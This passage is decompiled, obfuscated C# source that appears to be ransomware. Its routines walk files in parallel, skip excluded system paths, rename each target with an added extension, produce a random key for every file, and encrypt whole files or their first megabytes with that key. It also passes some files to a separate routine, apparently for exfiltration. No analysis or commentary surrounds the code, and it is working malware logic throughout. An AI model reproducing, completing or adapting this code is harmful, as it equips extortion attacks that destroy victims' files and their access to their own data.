							hvlXQSEyNEuZ.mNTXpbqUPeb(item);
						}
					}
					catch
					{
					}
				}
				GfJosmTooKpZJP.Add(item);
				if (!LvCohppTPrblek.Contains(Path.GetDirectoryName(item)))
				{
					LvCohppTPrblek.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (OKoHtjQYjxHns == getString_0(107396927) && fileStream.Length > Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024 && !list3.Contains(text))
					{
						if (bdRzRfVgdufg == getString_0(107396927))
						{
							foreach (string item2 in WIlNSOXrZeC)
							{
								if (item.ToLower().EndsWith(item2) && PIdfVhNVvVogR == getString_0(107396927))
								{
									if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && PIdfVhNVvVogR == getString_0(107396844))
								{
									try
									{
										UuDMKkzrJStt.xLFYxlCXWb(getString_0(107350584), getString_0(107350579), getString_0(107350598), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = YyTkJTBkSaQ.jABPxSWkmiBG(item, Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024);
						byte[] mRgSqllkMDRCm = YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						YyTkJTBkSaQ.asKfRIcataD(item, mRgSqllkMDRCm);
						if (string_2 != getString_0(107378027))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107378027))
					{
						euuwNJcsNndXOO(item, item + string_2, xdThOOfnYmOX);
					}
					else
					{
						euuwNJcsNndXOO(item, item + getString_0(107378022), xdThOOfnYmOX);
					}
				}
				catch (Exception)
				{
				}
				IL_0458:;
			}
		}
	}

	public static void NfBbtNwXVTws(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		QaTaQbhILmx.OxZrsuqEfySJDo CS_0024_003C_003E8__locals0 = new QaTaQbhILmx();
		CS_0024_003C_003E8__locals0.dDmITDjvmcD = list_0;
		CS_0024_003C_003E8__locals0.IUsTjCWCoatx = string_1;
		CS_0024_003C_003E8__locals0.xzDFOdTpuYCqZ = string_2;
		CS_0024_003C_003E8__locals0.ARnvboqDJfB = string_3;
		CS_0024_003C_003E8__locals0.ufPqetzKZi = new List<string> { getString_0(107350535) };
		if (OBXPdvxMybik == getString_0(107396844))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.dDmITDjvmcD)
				{
					if (!item.Contains(QaTaQbhILmx.getString_0(107350024)) && !item.Contains(QaTaQbhILmx.getString_0(107349999)) && !item.Contains(QaTaQbhILmx.getString_0(107349966)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349981)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349936)) && !item.Contains(QaTaQbhILmx.getString_0(107349943)) && !item.Contains(QaTaQbhILmx.getString_0(107349922)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349909)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349352)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349347)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349338)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349289)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349263)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349274)) && !item.Contains(QaTaQbhILmx.getString_0(107349249)) && !item.Contains(QaTaQbhILmx.getString_0(107349200)) && !item.Contains(QaTaQbhILmx.getString_0(107349215)) && !item.Contains(QaTaQbhILmx.getString_0(107349166)) && !item.Contains(QaTaQbhILmx.getString_0(107349181)) && !item.Contains(QaTaQbhILmx.getString_0(107349132)) && !item.Contains(QaTaQbhILmx.getString_0(107349147)) && !item.Contains(QaTaQbhILmx.getString_0(107349610)) && !item.Contains(QaTaQbhILmx.getString_0(107349629)) && !item.Contains(QaTaQbhILmx.getString_0(107349576)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349595)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349550)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349565)) && !item.ToLower().Contains(QaTaQbhILmx.getString_0(107349516)) && !item.Contains(gvCYkntYkqMW(QaTaQbhILmx.getString_0(107349531))) && !item.Contains(QaTaQbhILmx.getString_0(107349506)) && !item.Contains(QaTaQbhILmx.getString_0(107349493)) && !item.Contains(QaTaQbhILmx.getString_0(107349476)) && !item.EndsWith(CS_0024_003C_003E8__locals0.IUsTjCWCoatx) && !item.EndsWith(QaTaQbhILmx.getString_0(107349419)) && !item.EndsWith(QaTaQbhILmx.getString_0(107349414)) && !item.EndsWith(QaTaQbhILmx.getString_0(107349441)) && !item.EndsWith(QaTaQbhILmx.getString_0(107349436)) && !item.Contains(QaTaQbhILmx.getString_0(107349431)) && !item.Contains(ntagmnsgvSkoTT) && !item.Contains(vzSBJQFXpb) && !item.Contains(kVZoVJTgfl))
					{
						if (CS_0024_003C_003E8__locals0.xzDFOdTpuYCqZ.Length != 0)
						{
							string[] xzDFOdTpuYCqZ2 = CS_0024_003C_003E8__locals0.xzDFOdTpuYCqZ;
							int num2 = 0;
							while (num2 < xzDFOdTpuYCqZ2.Length)
							{
								string value2 = xzDFOdTpuYCqZ2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0c41;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.IUsTjCWCoatx))
							{
								goto IL_0c41;
							}
						}
						catch (Exception)
						{
							goto IL_0c41;
						}
						if (item.EndsWith(string_0) && !GfJosmTooKpZJP.Contains(item))
						{
							if (uvAbidagcyNet == QaTaQbhILmx.getString_0(107396947))
							{
								try
								{
									if (hvlXQSEyNEuZ.rbQAJqTFuy(item))
									{
										hvlXQSEyNEuZ.mNTXpbqUPeb(item);
									}
								}
								catch
								{
								}
							}
							GfJosmTooKpZJP.Add(item);
							if (!LvCohppTPrblek.Contains(Path.GetDirectoryName(item)))
							{
								LvCohppTPrblek.Add(Path.GetDirectoryName(item));
							}
							LsmwFBnODGufLo(item);
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0537;
									}
									goto end_IL_0537_2;
									end_IL_0537:;
								}
								catch (Exception ex16)
								{
									if (JJYUPCZGaGN)
									{
										try
										{
											File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + item + QaTaQbhILmx.getString_0(107459773) + ex16.Message + QaTaQbhILmx.getString_0(107397174));
										}
										catch (Exception)
										{
										}
									}
									AmOSyvkYqZhk++;
									goto end_IL_0537_2;
								}
								if (!(OKoHtjQYjxHns == QaTaQbhILmx.getString_0(107396947)) || new FileInfo(item).Length <= Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024 || CS_0024_003C_003E8__locals0.ufPqetzKZi.Contains(string_0))
								{
									if (FAXnWIlLgke)
									{
										CS_0024_003C_003E8__locals0.IUsTjCWCoatx = IHjeiOieyeiso + CS_0024_003C_003E8__locals0.IUsTjCWCoatx;
									}
									string text3 = auOSwAVUhkz.xXzlwQJswVbf(32);
									string s3 = RWAKpybrscGjni.tVtoOZjiqyF(text3);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
									{
										if (!DCETDGmAEgibl)
										{
											if (!CVCyEBDPJVibYms)
											{
												qxGcsYEaEgSP(item, item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, xdThOOfnYmOX);
											}
											else
											{
												qxGcsYEaEgSP(item, item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, Encoding.ASCII.GetBytes(text3));
											}
										}
										else
										{
											try
											{
												if (!CVCyEBDPJVibYms)
												{
													plvpumDZMr(item, item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, xdThOOfnYmOX);
												}
												else
												{
													plvpumDZMr(item, item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, Encoding.ASCII.GetBytes(text3));
												}
											}
											catch (Exception ex18)
											{
												if (JJYUPCZGaGN)
												{
													try
													{
														File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + item + QaTaQbhILmx.getString_0(107378001) + ex18.Message + QaTaQbhILmx.getString_0(107397174));
													}
													catch (Exception)
													{
													}
												}
												AmOSyvkYqZhk++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_0537_2;
											}
										}
									}
									else if (!DCETDGmAEgibl)
									{
										if (!CVCyEBDPJVibYms)
										{
											qxGcsYEaEgSP(item, item + QaTaQbhILmx.getString_0(107378042), xdThOOfnYmOX);
										}
										else
										{
											qxGcsYEaEgSP(item, item + QaTaQbhILmx.getString_0(107378042), Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!CVCyEBDPJVibYms)
											{
												plvpumDZMr(item, item, xdThOOfnYmOX);
											}
											else
											{
												plvpumDZMr(item, item, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex21)
										{
											if (JJYUPCZGaGN)
											{
												try
												{
													File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + item + QaTaQbhILmx.getString_0(107378001) + ex21.Message + QaTaQbhILmx.getString_0(107397174));
												}
												catch (Exception)
												{
												}
											}
											AmOSyvkYqZhk++;
											goto end_IL_0537_2;
										}
									}
									if (CVCyEBDPJVibYms)
									{
										if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
										{
											emEmxwYCVRMX(item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, bytes3);
										}
										else
										{
											emEmxwYCVRMX(item, bytes3);
										}
									}
									goto IL_0c41;
								}
								CS_0024_003C_003E8__locals0 = new QaTaQbhILmx.DYyXKyvgyZFMVsdn();
								CS_0024_003C_003E8__locals0.oguYRUacZk = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
									{
										if (FAXnWIlLgke)
										{
											CS_0024_003C_003E8__locals0.IUsTjCWCoatx = IHjeiOieyeiso + CS_0024_003C_003E8__locals0.IUsTjCWCoatx;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx);
									}
								}
								catch (Exception ex23)
								{
									if (JJYUPCZGaGN)
									{
										try
										{
											File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + item + QaTaQbhILmx.getString_0(107460224) + ex23.Message + QaTaQbhILmx.getString_0(107397174));
										}
										catch (Exception)
										{
										}
									}
									AmOSyvkYqZhk++;
									goto end_IL_0537_2;
								}
								CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA = QaTaQbhILmx.getString_0(107350555);
								if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
								{
									CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA = item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx;
								}
								else
								{
									CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA = item;
								}
								if (bdRzRfVgdufg == QaTaQbhILmx.getString_0(107396947))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in WIlNSOXrZeC)
										{
											if (CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.oguYRUacZk.IUsTjCWCoatx) && PIdfVhNVvVogR == QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107396950))
											{
												if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA).Length)
												{
													try
													{
														UuDMKkzrJStt.xLFYxlCXWb(QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107350607), QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107350602), QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107350621), CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA.ToLower().EndsWith(item2) && PIdfVhNVvVogR == QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107396867))
											{
												try
												{
													UuDMKkzrJStt.xLFYxlCXWb(QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107350607), QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107350602), QaTaQbhILmx.DYyXKyvgyZFMVsdn.getString_0(107350621), CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text4 = auOSwAVUhkz.xXzlwQJswVbf(32);
								string s4 = RWAKpybrscGjni.tVtoOZjiqyF(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (TJlCZFndoKUA == QaTaQbhILmx.getString_0(107396864))
								{
									byte[] array2 = null;
									byte[] byte_2 = YyTkJTBkSaQ.jABPxSWkmiBG(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024);
									if (YyTkJTBkSaQ.asKfRIcataD(MRgSqllkMDRCm: (!iRryUAENoXyxNt) ? (CVCyEBDPJVibYms ? YyTkJTBkSaQ.grhgCFxqniVe(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YyTkJTBkSaQ.grhgCFxqniVe(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (CVCyEBDPJVibYms ? ivMVFneIiiSs.QBYVYTkGHVQKD(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ivMVFneIiiSs.QBYVYTkGHVQKD(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IWBmTKARrJCu: CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, CemBOcHEZGvXd: bytes4))
									{
										goto IL_0c41;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!CVCyEBDPJVibYms)
								{
									if (moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, PnZVnKFyCNiuKv, CS_0024_003C_003E8__locals0.ARnvboqDJfB))
									{
										goto IL_0c41;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.VHlUNlIwvbXLA, PnZVnKFyCNiuKv, text4, bytes4))
									{
										goto IL_0c41;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_0537_2:;
							}
							catch (Exception)
							{
								goto IL_0c41;
							}
						}
					}
					continue;
					IL_0c41:
					CS_0024_003C_003E8__locals0.dDmITDjvmcD.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.dDmITDjvmcD, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new QaTaQbhILmx.OxZrsuqEfySJDo();
			CS_0024_003C_003E8__locals0.oguYRUacZk = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.BGIywWvGkY = string_0;
			if (!CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107350024)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349999)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349966)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349981)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349936)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349943)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349922)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349909)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349352)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349347)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349338)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349289)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349263)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349274)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349249)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349200)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349215)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349166)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349181)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349132)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349147)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349610)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349629)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349576)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349595)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349550)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349565)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().Contains(QaTaQbhILmx.getString_0(107349516)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(gvCYkntYkqMW(QaTaQbhILmx.getString_0(107349531))) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349506)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349493)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349476)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(CS_0024_003C_003E8__locals0.IUsTjCWCoatx) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(QaTaQbhILmx.getString_0(107349419)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(QaTaQbhILmx.getString_0(107349414)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(QaTaQbhILmx.getString_0(107349441)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(QaTaQbhILmx.getString_0(107349436)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(QaTaQbhILmx.getString_0(107349431)) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(ntagmnsgvSkoTT) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(vzSBJQFXpb) && !CS_0024_003C_003E8__locals0.BGIywWvGkY.Contains(kVZoVJTgfl))
			{
				if (CS_0024_003C_003E8__locals0.xzDFOdTpuYCqZ.Length != 0)
				{
					string[] xzDFOdTpuYCqZ = CS_0024_003C_003E8__locals0.xzDFOdTpuYCqZ;
					int num = 0;
					while (num < xzDFOdTpuYCqZ.Length)
					{
						string value = xzDFOdTpuYCqZ[num];
						if (!CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0df4;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.BGIywWvGkY.EndsWith(CS_0024_003C_003E8__locals0.IUsTjCWCoatx))
					{
						goto IL_0df4;
					}
				}
				catch (Exception)
				{
					goto IL_0df4;
				}
				if (!GfJosmTooKpZJP.Contains(CS_0024_003C_003E8__locals0.BGIywWvGkY))
				{
					if (uvAbidagcyNet == QaTaQbhILmx.getString_0(107396947))
					{
						try
						{
							if (hvlXQSEyNEuZ.rbQAJqTFuy(CS_0024_003C_003E8__locals0.BGIywWvGkY))
							{
								hvlXQSEyNEuZ.mNTXpbqUPeb(CS_0024_003C_003E8__locals0.BGIywWvGkY);
							}
						}
						catch
						{
						}
					}
					GfJosmTooKpZJP.Add(CS_0024_003C_003E8__locals0.BGIywWvGkY);
					if (!LvCohppTPrblek.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.BGIywWvGkY)))
					{
						LvCohppTPrblek.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.BGIywWvGkY));
					}
					LsmwFBnODGufLo(CS_0024_003C_003E8__locals0.BGIywWvGkY);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.BGIywWvGkY).Length != 0L)
							{
								goto end_IL_0656;
							}
							goto end_IL_0656_2;
							end_IL_0656:;
						}
						catch (Exception ex2)
						{
							if (JJYUPCZGaGN)
							{
								try
								{
									File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + QaTaQbhILmx.getString_0(107459773) + ex2.Message + QaTaQbhILmx.getString_0(107397174));
								}
								catch (Exception)
								{
								}
							}
							AmOSyvkYqZhk++;
							goto end_IL_0656_2;
						}
						if (OKoHtjQYjxHns == QaTaQbhILmx.getString_0(107396947) && new FileInfo(CS_0024_003C_003E8__locals0.BGIywWvGkY).Length > Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
								{
									if (FAXnWIlLgke)
									{
										CS_0024_003C_003E8__locals0.IUsTjCWCoatx = IHjeiOieyeiso + CS_0024_003C_003E8__locals0.IUsTjCWCoatx;
									}
									File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx);
								}
							}
							catch (Exception ex4)
							{
								if (JJYUPCZGaGN)
								{
									try
									{
										File.AppendAllText(vzSBJQFXpb, QaTaQbhILmx.getString_0(107378806) + CS_0024_003C_003E8__locals0.BGIywWvGkY + QaTaQbhILmx.getString_0(107460224) + ex4.Message + QaTaQbhILmx.getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								AmOSyvkYqZhk++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
							{
								CS_0024_003C_003E8__locals0.BGIywWvGkY += CS_0024_003C_003E8__locals0.IUsTjCWCoatx;
							}
							if (bdRzRfVgdufg == QaTaQbhILmx.getString_0(107396947))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in WIlNSOXrZeC)
									{
										if (CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.oguYRUacZk.IUsTjCWCoatx) && PIdfVhNVvVogR == QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107396953))
										{
											if (Convert.ToInt32(zshVWAjTCa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BGIywWvGkY).Length)
											{
												try
												{
													UuDMKkzrJStt.xLFYxlCXWb(QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107350610), QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107350605), QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107350624), CS_0024_003C_003E8__locals0.BGIywWvGkY);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.BGIywWvGkY.ToLower().EndsWith(item3) && PIdfVhNVvVogR == QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107396870))
										{
											try
											{
												UuDMKkzrJStt.xLFYxlCXWb(QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107350610), QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107350605), QaTaQbhILmx.OxZrsuqEfySJDo.getString_0(107350624), CS_0024_003C_003E8__locals0.BGIywWvGkY);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = auOSwAVUhkz.xXzlwQJswVbf(32);
							string s = RWAKpybrscGjni.tVtoOZjiqyF(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (TJlCZFndoKUA == QaTaQbhILmx.getString_0(107396864))
							{
								byte[] array = null;
								byte[] byte_ = YyTkJTBkSaQ.jABPxSWkmiBG(CS_0024_003C_003E8__locals0.BGIywWvGkY, Convert.ToInt32(PnZVnKFyCNiuKv) * 1024 * 1024);
								if (!YyTkJTBkSaQ.asKfRIcataD(MRgSqllkMDRCm: (!iRryUAENoXyxNt) ? (CVCyEBDPJVibYms ? YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YyTkJTBkSaQ.grhgCFxqniVe(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (CVCyEBDPJVibYms ? ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ivMVFneIiiSs.QBYVYTkGHVQKD(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ARnvboqDJfB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IWBmTKARrJCu: CS_0024_003C_003E8__locals0.BGIywWvGkY, CemBOcHEZGvXd: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!CVCyEBDPJVibYms)
							{
								if (!moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.BGIywWvGkY, PnZVnKFyCNiuKv, CS_0024_003C_003E8__locals0.ARnvboqDJfB))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!moeoEUcfSQywx.MtYwfepEBjPifI(CS_0024_003C_003E8__locals0.BGIywWvGkY, PnZVnKFyCNiuKv, text, bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, CS_0024_003C_003E8__locals0.BGIywWvGkY);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (FAXnWIlLgke)
							{
								CS_0024_003C_003E8__locals0.IUsTjCWCoatx = IHjeiOieyeiso + CS_0024_003C_003E8__locals0.IUsTjCWCoatx;
							}
							string text2 = auOSwAVUhkz.xXzlwQJswVbf(32);
							string s2 = RWAKpybrscGjni.tVtoOZjiqyF(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.IUsTjCWCoatx != QaTaQbhILmx.getString_0(107378047))
							{
								if (!DCETDGmAEgibl)
								{
									if (!CVCyEBDPJVibYms)
									{
										qxGcsYEaEgSP(CS_0024_003C_003E8__locals0.BGIywWvGkY, CS_0024_003C_003E8__locals0.BGIywWvGkY + CS_0024_003C_003E8__locals0.IUsTjCWCoatx, xdThOOfnYmOX);
									}
									else
									{
